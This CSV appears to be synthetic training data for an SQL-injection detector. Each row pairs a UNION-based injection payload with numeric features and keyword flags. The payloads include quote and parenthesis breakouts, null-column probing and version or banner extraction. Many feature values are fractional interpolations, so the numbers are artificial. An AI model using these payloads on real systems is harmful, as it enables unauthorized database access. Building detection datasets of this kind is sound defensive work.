id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000033,attack,union,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000331,0.02659121788843502,88.19933935203949,24.980066064796052,3.848601558442113,53.15947148163159,9.0,16.0,10.039867870407898,0.602674919379115,0.10206469687287162,0.18144834999621617,0.11381203375179731,1.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,6.039867870407898,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000034,attack,union,"-9237'  )   union all select 7454,7454,7454,7454,7454,7454,7454,7454,7454--",nearest_attack_euclidean,R000833,0.3576277015667267,77.07726960280158,21.415453920560317,3.6562180855988005,14.0,41.66181568224126,8.0,13.415453920560315,0.18181970426012967,0.540257565342672,0.10389697386293123,0.1740257565342672,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,8.415453920560317,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,union,"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000270,0.2876595789840585,108.71444185680728,26.152370542879513,3.7413558341175537,63.17155348544583,9.0,22.0,14.542888371361457,0.5804808292222234,0.08301145113445332,0.20291688055088586,0.13359083909243735,0.0,1.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,2.0,0.0,0.0,8.542888371361457,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,union,"-8002'   )    )     )   union all select 6647,6647,6647--",nearest_attack_euclidean,R000388,0.006525231292720319,57.0,21.0,3.684529961421674,14.0,16.0,18.0,9.0,0.24561403508771928,0.2807017543859649,0.3157894736842105,0.15789473684210525,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,0.0,0.0,2.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R001045,0.3087385629232261,92.0816903178372,26.583661936432563,3.991371928253324,25.0,33.665352254269756,22.0,11.416338063567439,0.2716909639829322,0.36529445762730856,0.23908804830498032,0.12392653008477898,0.0,1.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,2.0,0.0,0.0,4.416338063567439,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,union,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",nearest_attack_euclidean,R001454,0.13525156755363352,64.83136320697079,21.16627264139416,3.674197723821778,14.0,36.665090565576634,4.0,10.166272641394158,0.21611433765906,0.5653615762558777,0.061746953616874295,0.156777132468188,0.0,1.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,7.166272641394158,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001093,0.4495004446318311,64.58946879264262,17.0,3.2128270183104988,44.871575034114095,1.0,8.0,10.717893758528524,0.693789557331745,0.015619182745331611,0.12495346196265295,0.16563779796027042,1.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,1.0,0.0,6.717893758528524,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"-4798%'   )    )     )   union all select 3330,3330,3330#",nearest_attack_euclidean,R000693,0.3271292259966112,55.493445550296,23.602621779881602,3.7152724027350406,14.0,14.7947564402368,18.0,8.698689110059199,0.252730014269857,0.2656565412580167,0.32493858977553036,0.15667485469659595,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,1.0,0.0,1.6986891100591999,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,union,"-5054%""   )    )     )   union all select 8263,8263,8263,8263--",nearest_attack_euclidean,R001458,0.38739465647544796,64.09344339468181,22.0,3.7968241621092345,14.0,20.874754715745453,18.0,11.218688678936363,0.2197494402825696,0.3228297868149917,0.2825349946490181,0.1748857782534206,0.0,1.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,3.0,1.0,0.0,3.2186886789363633,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000775,0.22629849018422513,63.73451782737871,21.853096434524257,3.8000071143446865,14.0,24.0,14.587614261902967,11.146903565475743,0.21982183716542902,0.37683743514073553,0.22846322336988445,0.17487750432395097,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.146903565475742,1.0,0.0,4.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000435,0.49646346004745406,77.56477685776541,17.0,3.142947142511773,52.87044628446918,1.0,9.694330573296218,14.0,0.6819869165847108,0.012894167868195694,0.12460056539235338,0.18051835015474016,0.0,1.0,2.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.2823884288827032,1.0,0.0,8.717611571117297,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"-8588' union all select 2135,2135--",nearest_attack_euclidean,R000563,0.05304584582275417,35.0,19.225189956098017,4.070939053816862,14.0,12.0,4.0,5.0,0.4,0.34285714285714286,0.11428571428571428,0.14285714285714285,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,1.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"1'  )   where 6988  =  6988 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001162,0.1228901558149452,87.01224832175595,23.0,3.6710084873298983,51.80979865740476,9.0,14.0,12.20244966435119,0.5947657061629705,0.10377014856928454,0.16142023110777598,0.14004391415996892,1.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,7.202449664351191,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,union,-9841 where 4612  =  4612 union all select 4612--,nearest_attack_euclidean,R000822,0.41844620671226557,48.10964500148151,21.554822500740755,3.982086168589924,19.89035499851849,14.441878752592645,10.0,3.7774112503703776,0.4152127618590736,0.29836632147543557,0.20811952380280493,0.07830139286268592,0.0,0.0,2.777411250370378,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,0.0,3.777411250370378,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,union,"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001089,0.2632885151244475,78.27092164542088,22.44860522363861,3.685042771178105,49.61673731633671,9.0,10.0,9.654184329084176,0.6323566355278103,0.11606079078843898,0.12895643420937666,0.12262613947437401,1.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,6.654184329084176,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000048,attack,union,"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",nearest_attack_euclidean,R000612,0.33405418349136784,73.49351751677554,20.397407006710218,3.7246460015655845,14.0,38.794814013420435,8.0,12.698703503355109,0.19068395328859855,0.5275943524448592,0.10896225902205632,0.17275943524448592,0.0,1.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,0.0,0.0,7.698703503355109,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,union,"1' where 7445  =  7445 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R001432,0.2177678882339844,69.36911517204436,22.0,3.7867536974649108,41.69529213763549,9.0,10.0,8.673823034408873,0.6008309409676083,0.12989286458634244,0.14432540509593605,0.12495078935011325,1.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,4.673823034408873,3.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000050,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000173,0.4351735598050677,81.45274994949692,32.35824984849077,4.1612701905231075,40.0,2.9999999999999982,24.452749949496923,14.0,0.4911417686006285,0.03683563264504716,0.30012297974410435,0.17189961901022,3.0,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000051,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.02428058245145895,100.0,26.0,4.051604057410464,62.0,5.107714191684529,23.89228580831547,9.0,0.62,0.05107714191684529,0.23892285808315472,0.09,0.0,0.0,2.0,-2.168404344971009e-19,1.0,2.0,0.0,0.0,0.0,0.0,1.0,7.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.9999999999999999,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000052,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,1.9349911843920642,77.75940258774483,27.379701293872415,3.9434673089639576,40.0,2.9999999999999982,23.459900431290805,11.299502156454025,0.5151644274057954,0.03863733205543468,0.30189732886068793,0.14430091167808204,1.379701293872415,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,2.0,0.0,1.0,1.0,4.459900431290805,0.45990043129080493,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,union,"-9032   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",nearest_attack_euclidean,R000972,0.004504215755475544,80.02483521910519,21.004967043821036,3.512052362296811,14.0,40.01986817528415,14.0,12.004967043821038,0.17494886866654813,0.5000876537144889,0.17494886866654813,0.1500146089524148,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.0,0.0,0.0,8.004967043821036,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"-3860' union all select 3510,3510,3510#",nearest_attack_euclidean,R000686,0.018099634663681734,38.902635478367,20.980527095673402,4.148543965947572,14.0,15.922108382693605,4.0,4.980527095673401,0.3600023403490663,0.4091403161924423,0.10285781152830466,0.12799953193018673,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,1.9805270956734011,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"1"" where 2878  =  2878 union all select null,null,null,null,null#",nearest_attack_euclidean,R001546,0.04263222544787427,64.69649984044658,22.0,3.802836743861858,38.75719987235726,9.0,10.0,6.9392999680893155,0.5989883328014886,0.1391619234451233,0.15462435938347033,0.10722538436991783,0.0,1.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,0.0,0.0,0.0,3.9392999680893155,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,union,"1%'  )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001093,0.44752364214120177,64.57368311115087,17.0,3.2129904253495045,44.8589464889207,1.0,8.0,10.714736622230175,0.6937664031828787,0.015622587767223695,0.12498070213778968,0.16563030691210784,1.0,0.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,1.0,1.0,0.0,6.714736622230175,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R001519,0.048866229340637946,93.67017569930559,28.06596486013888,4.190545204306477,29.0,35.73614055944448,15.0,13.93403513986112,0.3096539451016182,0.38143328800057125,0.1601658336732508,0.14874693322455973,3.0,0.0,3.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,4.934035139861119,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000058,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000067,2.6738134334561727,105.14572080256795,28.0,4.095432386973116,62.0,4.0,26.59510948864909,12.550611313918864,0.590300891369022,0.038083928475420775,0.2519652445928354,0.11964993556272178,3.0,1.1012226278377282,2.0,-2.168404344971009e-19,1.0,2.0,0.0,0.8987773721622717,0.0,0.0,1.0,5.550611313918864,1.0,0.550611313918864,1.0,0.0,0.0,1.0,0.44938868608113597,0.0,0.0,0.0,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000059,attack,union,"-3349   )    )     )   union all select 6553,6553#",nearest_attack_euclidean,R000246,0.7725163489515808,48.09297527267441,21.14421483639536,3.6566891600146456,14.0,12.0,16.474380218139522,5.618595054534881,0.2918659316366926,0.25017079854573654,0.34135353599948304,0.11660973381808781,0.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,2.61859505453488,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000060,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000558,0.05784869729059406,55.0,19.0,3.8038553868746225,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.07272727272727271,0.16363636363636364,1.0,0.0,3.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,5.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union,"1"" union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000537,0.12900918833167105,59.01360641832504,15.0,3.0510230720366,45.21088513466003,1.0,4.0,8.802721283665008,0.76600907094555,0.016995464527224974,0.06798185810889995,0.14901360641832503,0.0,1.0,0.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,6.802721283665008,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,union,"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",nearest_attack_euclidean,R000212,0.02757405161907387,72.19809324035371,26.039618648070743,4.0628858751474395,41.15847459228297,9.0,15.0,7.039618648070743,0.5700014139210487,0.12469802859702178,0.207830047661703,0.09747050982022654,1.0,0.0,0.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,2.039618648070742,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000063,attack,union,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000400,0.007199892932334874,90.0549718776846,22.010994375536917,3.5716760721604,55.04397750214767,9.0,14.0,12.010994375536917,0.6112204119205424,0.09994213486559517,0.15546554312425914,0.13337191008960322,0.0,0.0,2.0,-2.168404344971009e-19,0.0,1.0,0.0,1.0,0.0,0.0,8.010994375536917,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000064,attack,union," select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000190,0.012271963123318172,93.97030675840207,26.980204505601385,3.7441913533933326,47.0,2.0,32.99010225280069,11.980204505601384,0.5001631496791095,0.021283538284217418,0.3510696152368479,0.12748369679982524,0.0,0.0,2.0,-2.168404344971009e-19,1.0,1.0,0.0,4.0,0.0,0.0,1.0,4.990102252800691,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000065,attack,union,"-2359' union all select 2687,2687,2687#",nearest_attack_euclidean,R000978,0.10631168065513977,39.0,21.632231730995482,4.21475897407602,14.0,16.0,4.0,5.0,0.358974358974359,0.41025641025641024,0.10256410256410256,0.1282051282051282,1.0,0.0,1.0,-2.168404344971009e-19,0.0,5.551115123125783e-17,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
